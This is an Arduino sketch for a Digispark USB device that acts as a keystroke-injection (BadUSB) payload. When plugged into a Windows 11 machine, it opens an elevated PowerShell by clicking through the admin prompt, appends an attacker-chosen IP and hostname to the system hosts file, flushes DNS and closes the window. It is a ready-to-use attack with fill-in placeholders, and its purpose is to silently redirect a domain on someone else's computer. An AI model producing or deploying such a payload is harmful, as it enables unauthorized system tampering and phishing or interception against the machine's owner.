/*
 
  
TESTED ON WINDOWS 11  


[IP ADDRESS] -> ip addres you want redirect to
[HOST NAME] -> domain you want to change
*/
#include "DigiKeyboard.h"
void setup() {}
void loop() {
  //open admin powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Add-Content C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS \"`n[IP ADDRESS][HOST NAME]\"");
  //flush dns cache 
  DigiKeyboard.println("ipconfig /flushdns");
  //exits the terminal
  DigiKeyboard.println("exit");
  for(;;){ /*empty*/ }
}
